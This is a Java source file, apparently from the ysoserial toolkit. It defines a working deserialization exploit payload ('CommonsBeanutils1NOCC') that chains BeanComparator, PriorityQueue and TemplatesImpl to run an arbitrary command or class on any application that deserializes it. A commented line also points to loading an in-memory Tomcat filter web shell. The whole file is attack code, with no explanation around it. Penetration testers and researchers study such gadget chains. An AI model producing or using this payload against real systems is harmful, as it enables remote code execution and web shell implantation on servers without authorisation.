package ysoserial.payloads;

import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({Authors.Y4ER})
public class CommonsBeanutils1NOCC implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1NOCC.class, args);

//        Object object = new CommonsBeanutils1NOCC().getObject("CLASS:TomcatFilterMemShell");
//        File file = new File("e:\\ser.ser");
//        if (file.exists()) file.delete();
//        Serializer.serialize(object, new FileOutputStream(file));
    }

    public Object getObject(final String command) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(command);
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
//        queue.add(new BigInteger("1"));
//        queue.add(new BigInteger("1"));
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = template;
        queueArray[1] = template;

        return queue;
    }
}
